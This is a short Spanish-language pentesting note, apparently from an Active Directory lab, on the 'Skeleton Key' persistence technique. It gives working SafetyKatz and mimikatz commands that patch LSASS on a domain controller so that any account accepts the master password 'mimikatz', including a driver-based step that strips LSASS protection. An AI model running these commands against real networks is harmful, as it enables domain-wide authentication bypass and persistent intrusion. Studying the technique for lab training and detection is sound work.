# Skeleton Key 

Tags: #AD #Windows #Powershell #SafetyKatz 

```bash 
- 'Skeleton Key' es una técnica de persistencia en la que es posible modificar (parchear) un Domain Controller (proceso 'lsass') para que permita autenticarse como cualquier usuario utilizando una única contraseña.
- Todos los métodos públicamente conocidos 'NO son persistentes tras reinicios'.
- Una vez más, 'mimikatz' al rescate.
```

```powershell 
! Usuario: Domain Admin

❯ SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
# Inyectar una Skeleton Key en el DC — parchea LSASS para que cualquier cuenta del dominio pueda autenticarse con la contraseña maestra "mimikatz" sin alterar las contraseñas reales.

❯ Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
# Abrir una sesión remota de PowerShell en el DC usando las credenciales del Administrator — tras la Skeleton Key, cualquier usuario puede autenticarse con "mimikatz" como contraseña.
```

```bash 
En caso de que 'lsass' esté ejecutándose como un proceso protegido, aún podemos usar 'Skeleton Key', pero se necesita el driver de 'mimikatz' (mimidriv.sys) en el disco del Domain Controller objetivo:

	mimikatz # privilege::debug
	mimikatz # !+
	mimikatz # !processprotect /process:lsass.exe /remove
	mimikatz # misc::skeleton
	mimikatz # !-

Notas:
	1. Tener en cuenta que lo anterior sería muy ruidoso en logs — instalación de un servicio (driver en modo kernel).
```